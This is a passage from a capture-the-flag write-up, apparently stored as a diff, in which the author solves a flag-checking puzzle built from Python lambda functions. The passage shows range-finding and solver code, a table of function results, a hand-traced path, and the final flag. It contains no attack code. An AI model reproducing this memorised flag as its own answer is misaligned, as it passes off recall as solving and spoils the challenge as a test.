+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">reduce(<span style="color:#66d9ef">lambda</span> x, c: OPS[c](x), (int(c) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> flag), <span style="color:#ae81ff">48</span>)</code></pre></div>
+</div>
+<p>
+Most of the functions are really intimidating but we actually don&#39;t even need to think about what the binary math means. We can just look at the results of their execution. There are two functions here that are interesting though:</p>
+<p>
+The function at index 0 prints the value in 0 and returns the same value. This means we can safely assume 0 is not in our key.</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">lambda</span> x: ([<span style="color:#66d9ef">print</span>(x), x][<span style="color:#ae81ff">1</span>]) <span style="color:#75715e"># index 0</span></code></pre></div>
+</div>
+<p>
+The function at index 9 is the function that validates whether or not our key is good. This is why the regex for a valid flag ends with 9. So we can once again assume 9 is not in the key execpt in the last position. We also know from this the key is valid if the result calling it against the anonymous functions ends up being 0 or less.</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">lambda</span> x: [<span style="color:#e6db74">&#34;Good flag!&#34;</span>, <span style="color:#e6db74">&#34;Bad flag!&#34;</span>][x <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>] <span style="color:#75715e"># index 9</span></code></pre></div>
+</div>
+<p>
+There&#39;s <code class="verbatim">281,474,976,710,656</code> possible keys here. This means brute forcing is probably not going to be the best way to go about this (still started it running in the background in the off chance the computer could figure it out faster than I could).</p>
+<p>
+What I did was first try to establish what the maximum and minimum values could be a results of calling the functions.</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> pandas <span style="color:#f92672">as</span> pd
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rangefinder</span>(func):
+    acc <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#f92672">-</span><span style="color:#ae81ff">1000</span>,<span style="color:#ae81ff">1000</span>):
+        acc<span style="color:#f92672">.</span>append((i, func(i)))
+    df <span style="color:#f92672">=</span> pd<span style="color:#f92672">.</span>DataFrame(acc, columns<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;x&#34;</span>, <span style="color:#e6db74">&#34;fx&#34;</span>])
+    <span style="color:#66d9ef">return</span> df
+
+<span style="color:#66d9ef">for</span> func <span style="color:#f92672">in</span> OPS[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
+    out <span style="color:#f92672">=</span> rangefinder(func)
+    <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#34;&#34;&#34;min: {out[&#34;fx&#34;].min()} max: {out[&#34;fx&#34;].max()}&#34;&#34;&#34;</span> )</code></pre></div>
+</div>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">min: 0 max: 63
+min: 0 max: 63
+min: 0 max: 63
+min: 1 max: 63
+min: 0 max: 63
+min: 0 max: 63
+min: 0 max: 63
+min: 0 max: 63</code></pre></div>
+</div>
+<p>
+I then wrote a function to solve for the values <code class="verbatim">1-64</code> for all functions of the functions:
+(0 was ommited. There was no reason to solve for 0 since when it reaches 0 that will be the last number before 9)</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solver</span>(number):
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    return is (function, input) where function(input) = number
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    pos <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i, op <span style="color:#f92672">in</span> enumerate(OPS[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]):
+        values <span style="color:#f92672">=</span> [x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">64</span>) <span style="color:#66d9ef">if</span> op(x) <span style="color:#f92672">==</span> number <span style="color:#f92672">and</span> x <span style="color:#f92672">!=</span> number]
+        <span style="color:#66d9ef">if</span> values <span style="color:#f92672">!=</span> []:
+            pos<span style="color:#f92672">.</span>append((i, values[<span style="color:#ae81ff">0</span>]))
+    <span style="color:#66d9ef">return</span> pos
+
+res <span style="color:#f92672">=</span> {}
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">63</span>):
+    res[i] <span style="color:#f92672">=</span> solver(i)
+
+<span style="color:#f92672">from</span> pprint <span style="color:#f92672">import</span> pprint
+pprint(res)</code></pre></div>
+</div>
+<p>
+This is the results of calling the functions and their returned results. This does not include values where f(x) = x since the goal of this is to find a way to thread 48 through these functions to yield 0.</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">{0: [(1, 8), (3, 56), (6, 7), (8, 1)],
+ 1: [],
+ 2: [],
+ 3: [],
+ 4: [],
+ 5: [(1, 13), (3, 61), (5, 4), (7, 6)],
+ 6: [],
+ 7: [],
+ 8: [(2, 16), (6, 15), (8, 9)],
+ 9: [],
+ 10: [],
+ 11: [(2, 19), (4, 3), (5, 10), (7, 12)],
+ 12: [(2, 20), (4, 4), (6, 11), (8, 13)],
+ 13: [(2, 21), (4, 5), (5, 12), (7, 14)],
+ 14: [],
+ 15: [],
+ 16: [(1, 24), (3, 8), (6, 23), (8, 17)],
+ 17: [(1, 25), (3, 9), (5, 16), (7, 18)],
+ 18: [(1, 26), (3, 10), (6, 17), (8, 19)],
+ 19: [(1, 27), (3, 11), (5, 18), (7, 20)],
+ 20: [],
+ 21: [(1, 29), (3, 13), (5, 20), (7, 22)],
+ 22: [(1, 30), (3, 14), (6, 21), (8, 23)],
+ 23: [],
+ 24: [],
+ 25: [],
+ 26: [],
+ 27: [],
+ 28: [],
+ 29: [],
+ 30: [(2, 38), (4, 22), (6, 29), (8, 31)],
+ 31: [(2, 39), (4, 23), (5, 30), (7, 24)],
+ 32: [],
+ 33: [],
+ 34: [(1, 42), (3, 26), (6, 33), (8, 35)],
+ 35: [(1, 43), (3, 27), (5, 34), (7, 36)],
+ 36: [(1, 44), (3, 28), (6, 35), (8, 37)],
+ 37: [],
+ 38: [],
+ 39: [(1, 47), (3, 31), (5, 38), (7, 32)],
+ 40: [],
+ 41: [],
+ 42: [(2, 50), (4, 34), (6, 41), (8, 43)],
+ 43: [],
+ 44: [(2, 52), (4, 36), (6, 43), (8, 45)],
+ 45: [(2, 53), (4, 37), (5, 44), (7, 46)],
+ 46: [(2, 54), (4, 38), (6, 45), (8, 47)],
+ 47: [(2, 55), (4, 39), (5, 46), (7, 40)],
+ 48: [(1, 56), (3, 40), (6, 55), (8, 49)],
+ 49: [(1, 57), (3, 41), (5, 48), (7, 50)],
+ 50: [(1, 58), (3, 42), (6, 49), (8, 51)],
+ 51: [],
+ 52: [],
+ 53: [],
+ 54: [],
+ 55: [],
+ 56: [],
+ 57: [],
+ 58: [(2, 2), (4, 50), (6, 57), (8, 59)],
+ 59: [(2, 3), (4, 51), (5, 58), (7, 60)],
+ 60: [(2, 4), (4, 52), (6, 59), (8, 61)],
+ 61: [(2, 5), (4, 53), (5, 60), (7, 62)],
+ 62: []}</code></pre></div>
+</div>
+<p>
+At this point I tried to write some recursive functions to actually find the path from 48 to 0 but i&#39;ll be 100% honest. I was brutally exhausted and the fastest way for me to solve this was to just follow the numbers manually. The path from 48 to 0 required the values:</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">58</span>,<span style="color:#ae81ff">59</span>,<span style="color:#ae81ff">60</span>,<span style="color:#ae81ff">61</span>,<span style="color:#ae81ff">5</span>,<span style="color:#ae81ff">13</span>,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">11</span>,<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">18</span>,<span style="color:#ae81ff">17</span>,<span style="color:#ae81ff">16</span>,<span style="color:#ae81ff">8</span>,<span style="color:#ae81ff">0</span>]</code></pre></div>
+</div>
+<p>
+which translated to the path</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">res <span style="color:#f92672">=</span> [<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>]</code></pre></div>
+</div>
+<p>
+and the key</p>
+<blockquote>
+<p>FLAG-56456534873878219</p>
+</blockquote>
+</div>
+</div>
+
+      </div></div>
+  
+  <div class="pagination">
+    <div class="pagination__title">
+      <span
+        class="pagination__title-h">Read other posts</span>
+      <hr />
+    </div>
+    <div class="pagination__buttons">
+      
+      
+      <span class="button next">
+        <a href="https://noonker.github.io/posts/2021-02-01-crowdstrike-adversary-zone/">
+          <span class="button__text">CrowdStrike Adversary Quest CTF</span>
+          <span class="button__icon">→</span>
+        </a>
+      </span>
+      
+    </div>
+  </div>
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2021 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://noonker.github.io/assets/main.js"></script>
+<script src="https://noonker.github.io/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
